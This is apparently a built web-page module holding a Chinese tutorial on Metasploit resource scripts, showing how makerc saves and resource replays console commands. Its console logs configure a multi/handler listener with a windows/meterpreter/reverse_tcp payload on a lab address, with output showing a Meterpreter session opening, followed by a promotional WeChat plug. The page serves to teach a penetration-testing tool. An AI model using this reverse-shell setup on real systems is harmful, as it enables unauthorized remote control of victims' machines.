import{i as e,r as t,s as n,t as r}from"./app-DhNsCJFJ.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-05-02-022-Metasploit%E8%B5%84%E6%BA%90%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.html","title":"Metasploit资源脚本的使用方法","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"Metasploit资源脚本的使用方法","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"Metasploit资源脚本的使用方法","lock":"need"},"git":{"updatedTime":1777682567000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"01c1cb07034c1d0e494eb2e17da027b78c49263b","time":1777682567000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: AI全链路短剧生成平台"}]},"filePathRelative":"md/hack/tools/2022-05-02-022-Metasploit资源脚本的使用方法.md"}`),a={name:`2022-05-02-022-Metasploit资源脚本的使用方法.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="metasploit资源脚本的使用方法" tabindex="-1"><a class="header-anchor" href="#metasploit资源脚本的使用方法"><span>Metasploit资源脚本的使用方法</span></a></h1><p>Metasploit可以通过资源脚本实现自动化——使用资源脚本可以免去手动设置选项，实现选项的自动化设置，从而节省配置模块选项和攻击载荷所花费的时间。</p><p>创建资源脚本有两种方法：手动创建脚本或使用makerc命令创建脚本。makerc命令将之前输入过的所有命令都保存到一个文件中，可以使用resource命令使用这个文件。</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf5 &gt; use exploit/multi/handler </span>
<span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span>
<span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span>
<span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.175.128</span>
<span class="line">LHOST =&gt; 192.168.175.128</span>
<span class="line">msf5 exploit(multi/handler) &gt; set LPORT 4444</span>
<span class="line">LPORT =&gt; 4444</span>
<span class="line">msf5 exploit(multi/handler) &gt; show options</span>
<span class="line"></span>
<span class="line">Module options (exploit/multi/handler):</span>
<span class="line"></span>
<span class="line">   Name  Current Setting  Required  Description</span>
<span class="line">   ----  ---------------  --------  -----------</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options (windows/meterpreter/reverse_tcp):</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span>
<span class="line">   LHOST     192.168.175.128  yes       The listen address (an interface may be specified)</span>
<span class="line">   LPORT     4444             yes       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   0   Wildcard Target</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf5 exploit(multi/handler) &gt; exploit</span>
<span class="line"></span>
<span class="line">[*] Started reverse TCP handler on 192.168.175.128:4444 </span>
<span class="line">[*] Sending stage (179779 bytes) to 192.168.175.130</span>
<span class="line">[*] Meterpreter session 1 opened (192.168.175.128:4444 -&gt; 192.168.175.130:1025) at 2019-01-25 23:27:58 +0800</span>
<span class="line"></span>
<span class="line">meterpreter &gt; exit</span>
<span class="line">[*] Shutting down Meterpreter...</span>
<span class="line"></span>
<span class="line">[*] 192.168.175.130 - Meterpreter session 1 closed.  Reason: User exit</span>
<span class="line">msf5 exploit(multi/handler) &gt; makerc</span>
<span class="line">Usage: makerc &lt;output rc file&gt;</span>
<span class="line"></span>
<span class="line">Save the commands executed since startup to the specified file.</span>
<span class="line"></span>
<span class="line">msf5 exploit(multi/handler) &gt; makerc multi_handler</span>
<span class="line">[*] Saving last 8 commands to multi_handler ...</span>
<span class="line">msf5 exploit(multi/handler) &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里，我们通过设置攻击载荷和各种选项，成功启动了一个渗透模块handler，输入makerc命令就可以将这些命令保存到一个指定的文件中。在这个示例中是multi_handler文件，我们保存了最近使用的8条命令。</p><p>接下来，我们就要通过resource命令使用这个资源文件，达到选项的自动化设置，如下所示：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf5 exploit(multi/handler) &gt; resource multi_handler </span>
<span class="line">[*] Processing /root/multi_handler for ERB directives.</span>
<span class="line">resource (/root/multi_handler)&gt; use exploit/multi/handler</span>
<span class="line">resource (/root/multi_handler)&gt; set payload windows/meterpreter/reverse_tcp</span>
<span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span>
<span class="line">resource (/root/multi_handler)&gt; set LHOST 192.168.175.128</span>
<span class="line">LHOST =&gt; 192.168.175.128</span>
<span class="line">resource (/root/multi_handler)&gt; set LPORT 4444</span>
<span class="line">LPORT =&gt; 4444</span>
<span class="line">resource (/root/multi_handler)&gt; show options</span>
<span class="line"></span>
<span class="line">Module options (exploit/multi/handler):</span>
<span class="line"></span>
<span class="line">   Name  Current Setting  Required  Description</span>
<span class="line">   ----  ---------------  --------  -----------</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options (windows/meterpreter/reverse_tcp):</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span>
<span class="line">   LHOST     192.168.175.128  yes       The listen address (an interface may be specified)</span>
<span class="line">   LPORT     4444             yes       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   0   Wildcard Target</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">resource (/root/multi_handler)&gt; exploit</span>
<span class="line"></span>
<span class="line">[*] Started reverse TCP handler on 192.168.175.128:4444 </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,10)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};